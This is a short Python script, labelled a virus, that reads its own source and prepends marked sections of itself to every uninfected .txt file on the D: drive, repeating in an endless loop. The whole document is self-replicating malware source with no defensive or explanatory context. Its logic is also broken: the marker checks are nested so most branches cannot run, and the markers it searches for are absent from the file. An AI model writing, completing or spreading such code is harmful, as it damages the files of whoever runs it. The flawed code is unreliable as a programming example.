import sys, glob

#VIRUS start
print('VIRUS DEPLOYED')
# 4 bytes per sec
while True:
    virus_script = []
    in_virus = False
    in_payload = False
    with open(sys.argv[0], 'r') as hell:
        for line in hell.readlines():
            if line == '##### VIRUS #####\n':
                in_virus = True
                if in_virus:
                    if in_payload:
                        virus_script.append(line[2:])
                else:
                    virus_script.append(line)
                    if line == '######### VIRUS PAYLOAD ########\n':
                        in_payload = True
                        if line == '####### VIRUS END ########\n':
                            break
    # locate to infect
    programs = glob.glob('D://*.txt') #(os.walk) to infect every file in C drive
    for program in programs:
        infected = False
        with open(program, 'r') as f:
            program_code = f.readlines()
            for line in program_code:
                if line == '##### VIRUS #####\n':
                    infected = True
                    break
        if not infected:
            new_code = []
            new_code.extend(virus_script)
            new_code.append('\n\n')
            new_code.extend(program_code)
            with open(program, 'w') as f:
                f.writelines(new_code)
